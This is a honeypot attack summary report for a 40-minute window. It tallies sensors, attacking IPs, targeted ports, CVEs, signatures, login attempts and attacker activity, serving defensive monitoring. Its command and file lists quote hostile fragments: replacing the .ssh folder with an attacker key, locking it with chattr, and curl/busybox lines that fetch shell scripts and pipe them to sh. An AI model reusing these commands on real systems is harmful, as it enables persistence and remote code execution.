Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-24T22:01:28Z
**Timeframe:** 2025-10-24T21:20:01Z to 2025-10-24T22:00:02Z
**Log Files:** agg_log_20251024T212001Z.json, agg_log_20251024T214001Z.json, agg_log_20251024T220002Z.json

**Executive Summary**

This report summarizes 19,952 malicious events detected by honeypot sensors over a period of approximately 40 minutes. The majority of attacks were captured by the Cowrie, Honeytrap, and Suricata honeypots. The most prominent attack vector was SSH, with a high volume of brute-force attempts. A significant number of scans for MS Terminal Server and SIP services were also observed. The most frequently attacking IP address was 109.205.211.9. Several CVEs were targeted, with CVE-2022-27255 being the most common.

**Detailed Analysis**

***Attacks by Honeypot***

*   Cowrie: 7335
*   Honeytrap: 4834
*   Suricata: 4693
*   Ciscoasa: 1820
*   Sentrypeer: 907
*   Mailoney: 139
*   Dionaea: 41
*   Adbhoney: 40
*   Tanner: 40
*   H0neytr4p: 29
*   Redishoneypot: 21
*   Ipphoney: 19
*   ConPot: 12
*   Heralding: 9
*   ssh-rsa: 8
*   ElasticPot: 3
*   Honeyaml: 2

***Top Attacking IPs***

*   109.205.211.9: 2208
*   80.94.95.238: 1703
*   199.127.63.138: 1465
*   198.23.190.58: 1331
*   20.2.136.52: 1250
*   114.67.125.183: 581
*   209.141.47.6: 288
*   103.154.216.188: 288
*   107.170.36.5: 255
*   154.91.170.15: 218
*   199.195.251.10: 214
*   103.231.14.54: 212
*   95.79.112.59: 212
*   23.95.37.90: 208
*   117.2.142.24: 184
*   36.50.55.55: 168
*   138.68.171.6: 155
*   91.237.163.112: 134
*   174.138.38.19: 129
*   79.61.112.234: 129

***Top Targeted Ports/Protocols***

*   22: 1228
*   5060: 907
*   UDP/5060: 616
*   8333: 192
*   25: 139
*   5903: 134
*   5901: 116
*   5905: 78
*   5904: 78
*   TCP/80: 77
*   TCP/22: 61
*   5907: 54
*   5908: 52
*   5909: 50
*   8728: 40
*   27018: 34
*   23: 32
*   443: 31
*   5902: 29
*   5431: 19

***Most Common CVEs***

*   CVE-2022-27255: 58
*   CVE-2002-0013 CVE-2002-0012: 11
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 8
*   CVE-2019-16920: 1
*   CVE-2021-35395: 1
*   CVE-2016-20017: 1
*   CVE-2024-12856 CVE-2024-12885: 1
*   CVE-2014-6271: 1
*   CVE-2023-52163: 1
*   CVE-2023-47565: 1
*   CVE-2023-31983: 1
*   CVE-2024-10914: 1
*   CVE-2015-2051 CVE-2019-10891 CVE-2024-33112 CVE-2025-11488 CVE-2022-37056: 1
*   CVE-2009-2765: 1
*   CVE-2024-3721: 1
*   CVE-2006-3602 CVE-2006-4458 CVE-2006-4542: 1
*   CVE-2021-42013: 1

***Commands Attempted by Attackers***

*   cd ~; chattr -ia .ssh; lockr -ia .ssh: 20
*   lockr -ia .ssh: 20
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...": 20
*   cat /proc/cpuinfo | grep name | wc -l: 20
*   cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 20
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 20
*   ls -lh $(which ls): 20
*   which ls: 20
*   crontab -l: 20
*   w: 20
*   uname -m: 20
*   cat /proc/cpuinfo | grep model | grep name | wc -l: 20
*   top: 20
*   uname: 20
*   uname -a: 21
*   whoami: 20
*   lscpu | grep Model: 19
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 19
*   Enter new UNIX password: : 13
*   Enter new UNIX password:": 13

***Signatures Triggered***

*   ET SCAN MS Terminal Server Traffic on Non-standard Port: 2102
*   2023753: 2102
*   ET HUNTING RDP Authentication Bypass Attempt: 646
*   2034857: 646
*   ET SCAN Sipsak SIP scan: 540
*   2008598: 540
*   ET DROP Dshield Block Listed Source group 1: 353
*   2402000: 353
*   ET SCAN NMAP -sS window 1024: 180
*   2009582: 180
*   ET INFO Reserved Internal IP Traffic: 59
*   2002752: 59
*   ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255): 58
*   2038669: 58
*   ET CINS Active Threat Intelligence Poor Reputation IP group 50: 24
*   2403349: 24
*   ET CINS Active Threat Intelligence Poor Reputation IP group 51: 23
*   2403350: 23
*   ET CINS Active Threat Intelligence Poor Reputation IP group 44: 13
*   2403343: 13

***Users / Login Attempts***

*   345gs5662d34/345gs5662d34: 15
*   root/: 6
*   root/1q2w3e4r: 5
*   A large number of unique username/password combinations were attempted, with the majority targeting the 'root' user.

***Files Uploaded/Downloaded***

*   wget.sh;: 16
*   w.sh;: 4
*   c.sh;: 4
*   104.199.212.115: 5
*   server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=: 3
*   rondo.dgx.sh||busybox: 3
*   rondo.dgx.sh||curl: 3
*   rondo.dgx.sh)|sh&: 3
*   system.html: 2
*   rondo.tkg.sh|sh&echo: 2
*   rondo.qre.sh||busybox: 2
*   rondo.qre.sh||curl: 2
*   rondo.qre.sh)|sh: 2
*   cfg_system_time.htm: 2

***HTTP User-Agents***

*   Not observed in this period.

***SSH Clients and Servers***

*   Not observed in this period.

***Top Attacker AS Organizations***

*   Not observed in this period.

**Key Observations and Anomalies**

*   The high number of Cowrie events indicates a focus on SSH-based attacks.
*   The commands executed after successful logins suggest attempts to gather system information, disable security measures, and install malicious software.
*   The `wget` and `curl` commands indicate attempts to download and execute scripts from remote servers.
*   The prevalence of scans for MS Terminal Server and SIP services on non-standard ports suggests automated scanning for vulnerable services.
*   The targeting of CVE-2022-27255, a Realtek SDK vulnerability, indicates that attackers are actively exploiting known vulnerabilities in IoT and embedded devices.

This report highlights the continuous and automated nature of attacks on internet-facing systems. The observed tactics, techniques, and procedures (TTPs) are consistent with those used by botnets and other automated threats. Continued monitoring of these activities is recommended.